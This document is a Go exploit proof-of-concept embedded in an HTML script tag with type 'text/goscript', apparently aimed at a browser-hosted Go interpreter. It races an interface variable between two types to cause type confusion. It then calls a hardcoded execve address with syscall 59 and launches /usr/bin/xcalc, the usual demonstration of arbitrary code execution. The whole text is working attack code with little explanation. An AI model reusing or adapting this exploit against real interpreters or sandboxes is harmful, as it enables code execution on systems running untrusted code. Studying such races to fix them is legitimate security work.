<script type="text/goscript">
package main

import (
	"fmt"
)

type itf interface {
	X() bool
}

type safe struct {
	f *int
}

type unsafe struct {
	f func(uintptr, uintptr, uintptr, uintptr) bool
}

// strings for execve
var bin_sh_slice []uint8
var display []uint8

// interfaces for race
var good itf
var bad itf
var confused itf

// args for execve
var argv []uintptr
var env []uintptr

// retrieve address of of type
func address(i interface{}) uint64 {
	ptr_str := fmt.Sprintf("%p", i)

	var val uint64

	for i := 2; i < len(ptr_str); i++ {
		val *= 0x10
		if '0' <= ptr_str[i] && ptr_str[i] <= '9' {
			cur_digit := ptr_str[i] - '0'
			val += uint64(cur_digit)
		} else {
			cur_digit := ptr_str[i] - 'a' + 10
			val += uint64(cur_digit)
		}
	}

	return val
}

func (s *safe) X() bool {
	return false
}

func (u *unsafe) X() bool {
	if u.f != nil {
        // call syscall_Syscall6 with __NR_execve as syscall number
        // and args to execute `xcalc`
		u.f(59, uintptr(address(bin_sh_slice)), uintptr(address(argv)),
			uintptr(address(env)))
	}

	return false
}

func main() {
    // prepare string for execve
	argv = make([]uintptr, 5)
	env = make([]uintptr, 5)

	bin_sh_slice = make([]uint8, 20)
	shell := "/usr/bin/xcalc"
	for v := 0; v < len(shell); v++ {
		bin_sh_slice[v] = uint8(shell[v])
	}

	argv[0] = uintptr(address(bin_sh_slice))

	display = make([]uint8, 20)
	env_var := "DISPLAY=:0"
	for v := 0; v < len(env_var); v++ {
		display[v] = uint8(env_var[v])
	}

	env[0] = uintptr(address(display))

    // prepare interfaces implementation
	pp := 0x0000000000480da0 // address of execve
	good = &safe{f: &pp}
	bad = &unsafe{}
	confused = good

	go func() {
        var i int
        //start the race
		for {
			confused = bad
			confused = good
			i++

			if i > 100000 {
				break
			}
		}
	}()

	// we want confused to point to the type of unsafe (where func is)
	// but still have the value of safe (a pointer we control)
	for {
		confused.X()
	}
}
</script>
